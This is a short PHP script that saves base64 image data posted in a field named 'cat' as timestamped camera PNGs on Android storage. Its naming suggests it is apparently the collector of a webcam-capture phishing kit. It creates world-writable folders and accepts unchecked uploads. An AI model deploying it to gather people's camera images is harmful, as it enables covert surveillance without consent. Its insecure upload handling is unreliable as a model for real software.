<?php
$date = date('dMYHis');
$imageData = $_POST['cat'];

$folderPath = "/storage/emulated/0/ACamPhoto/";

if (!file_exists($folderPath)) {
    mkdir($folderPath, 0777, true);
}

if (!empty($imageData)) {
    error_log("Received" . "\r\n", 3, "Log.log");

    // Base64 ডাটা ফিল্টার করা
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);

    $filePath = $folderPath . "cam" . $date . ".png";

    file_put_contents($filePath, $unencodedData);

    echo json_encode(["status" => "success", "path" => $filePath]);
} else {
    echo json_encode(["status" => "error", "message" => "No image data received"]);
}

exit();
?>
